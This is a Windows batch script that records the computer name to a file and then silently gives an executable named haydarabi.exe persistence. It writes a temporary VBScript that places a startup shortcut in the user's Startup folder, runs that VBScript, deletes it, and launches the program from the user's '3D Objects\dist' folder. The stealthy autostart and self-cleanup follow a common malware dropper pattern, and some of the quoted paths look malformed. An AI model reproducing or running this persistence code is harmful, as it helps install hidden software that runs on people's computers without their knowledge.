color a
echo %computername%/>C:\Users\'%USERNAME%'\"3D Objects"\dist\acilis.txt
echo Set oWS = WScript.CreateObject("WScript.Shell") > CreateShortcut.vbs
echo sLinkFile = "%HOMEDRIVE%%HOMEPATH%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\haydarabi.lnk" >> CreateShortcut.vbs
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> CreateShortcut.vbs
set mypath=%cd%
echo %HOMEDRIVE%%HOMEPATH%
echo oLink.TargetPath = "%HOMEDRIVE%%HOMEPATH%\'3D Objects'\dist\haydarabi.exe" >> CreateShortcut.vbs
echo oLink.Save >> CreateShortcut.vbs
cscript CreateShortcut.vbs
del CreateShortcut.vbs
start C:\Users\"%USERNAME%"\"3D Objects"\dist\haydarabi.exe
exit 0
